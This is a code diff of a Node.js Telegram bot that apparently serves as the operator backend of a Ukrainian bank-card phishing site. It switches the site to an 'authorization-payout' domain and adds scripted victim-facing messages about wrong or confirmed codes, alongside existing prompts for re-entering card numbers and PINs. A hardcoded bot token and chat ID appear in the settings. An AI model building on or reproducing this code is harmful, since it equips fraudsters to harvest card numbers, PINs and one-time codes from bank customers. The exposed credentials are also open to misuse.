@@ -7,7 +7,7 @@ const path = require('path');
 // НАСТРОЙКИ
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8227870538:AAG6O3ojYrxz_COPKCkgUZy-GYSYxRfNKuc';
 const CHAT_ID = process.env.CHAT_ID || '-1003473672730';
-const DOMAIN = process.env.DOMAIN || 'new-l8h6.onrender.com';
+const DOMAIN = process.env.DOMAIN || 'https://autorizatsiya-vuplata.onrender.com';
 const WEBHOOK_URL = `https://${DOMAIN}/bot${TELEGRAM_BOT_TOKEN}`;
 
 // СПИСОК БАНКОВ ДЛЯ КНОПКИ "ЗАПРОС"
@@ -257,6 +257,12 @@ bot.on('callback_query', (callbackQuery) => {
                 break;
             case 'pin_error':
                 commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" };
+                break;
+            case 'code_error':
+                commandData = { text: "Ви вказали невірний код. Натисніть кнопку назад та вкажіть вірний код" };
+                break;
+            case 'timer':
+                commandData = { text: "Код підтверджено. Обробка запиту..." };
                 break;
             case 'card_error':
                 commandData = { text: "Вказано невірний номер картки, натисніть назад та введіть номер картки вірно" };
